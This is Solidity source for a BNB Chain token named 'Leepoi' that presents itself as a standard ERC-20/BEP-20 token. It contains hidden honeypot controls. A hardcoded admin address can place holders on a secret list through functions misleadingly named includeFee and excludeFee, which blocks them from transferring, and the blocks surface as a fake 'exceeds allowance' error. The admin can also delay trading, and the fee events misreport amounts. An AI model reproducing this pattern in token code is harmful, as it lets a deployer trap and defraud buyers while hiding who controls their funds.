/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.5.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address georgeA) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }
 
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}
contract leepoi is Context, IERC20, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _georgeA; 
  mapping (address => uint256) public georgeList;
  mapping (address => bool) private __georgeList;
  uint256 private _totalSupply;
  uint256 private startTime = 1694916830;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  uint256 public taxMan = 0; 
  uint256 private _previousTax = taxMan;
  address public uniswapV2Pair;
  address public uniswapV2Router = address(0xA64A5582E56270aD47e3aa77E9c7ee807189875d);
  address private adminAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 

  constructor() public {
    _name = "Leepoi";
    _symbol = "Leepoi";
    _decimals = 6;
    _totalSupply = 10000000000000; 
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address george) external view returns (uint256) {
    return _balances[george];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function getStarttime() external view returns (uint256) {
    return startTime;
  }

  function getTime() external view returns (uint256) {
    return block.timestamp;
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
  }

    function includeFee(address[] memory _georgeList) public {
        require(_msgSender() == adminAddress);
        for (uint256 i = 0; i < _georgeList.length; i++) {
            __georgeList[_georgeList[i]] = true; }
    }

    function excludeFee(address remove) public {
        require(_msgSender() == adminAddress);
        __georgeList[remove] = false;
    }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0) || recipient != address(0), "ERC20: transfer contains the zero address");
    require(!__georgeList[sender] || !__georgeList[recipient], "ERC20: transfer amount exceeds allowance");
    if(recipient !=uniswapV2Pair && sender != owner()){
        if(block.timestamp<startTime){
            revert("ERC20: timestamp less than start time");}}
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
                bool takeFee = true;
                if(_georgeA[sender]){
                    takeFee = false;}
                _tokenTransfer(sender,recipient,amount,takeFee);
  }

    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            if(!takeFee) {
                removeAllFee();
            }
            _transferStandard(sender, recipient, amount);
            if(!takeFee) {
                restoreAllFee();
            }
  }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        require(!__georgeList[sender]);
        uint256 tTax = calculateTax(tAmount);
        _takeTax(sender, tTax);
        uint256 tTransferAmount = tAmount.sub(tTax);
        emit Transfer(sender, recipient, tTransferAmount);
  }

    function _takeTax(address sender,uint256 tTax) private {
        if(tTax > 0) {
            emit Transfer(sender, adminAddress, tTax);
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal {
            require(owner != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
  }
    function setStartTime(uint256 time) public {
                require(_msgSender() == adminAddress);
                startTime = time;
        }
    function setPair(address uniswapPair) public {
                require(_msgSender() == adminAddress);
                uniswapV2Pair = uniswapPair;
        }
    function setRouter(address uniswapRouter) public {
                require(_msgSender() == adminAddress);
                uniswapV2Router = uniswapRouter;
        }

    function tax() private view returns (uint256) {
            return taxMan;
    }
    function calculateTax(uint256 _amount) private view returns (uint256) {
            return _amount.mul(taxMan).div(
                10**2
            );
        }
    function removeAllFee() private {
            require(_msgSender() == adminAddress);
            if(taxMan == 0 ) return;
            _previousTax = taxMan;
            taxMan = 0;
    }
    function restoreAllFee() private {
            require(_msgSender() == adminAddress);
            taxMan = _previousTax;
  }
}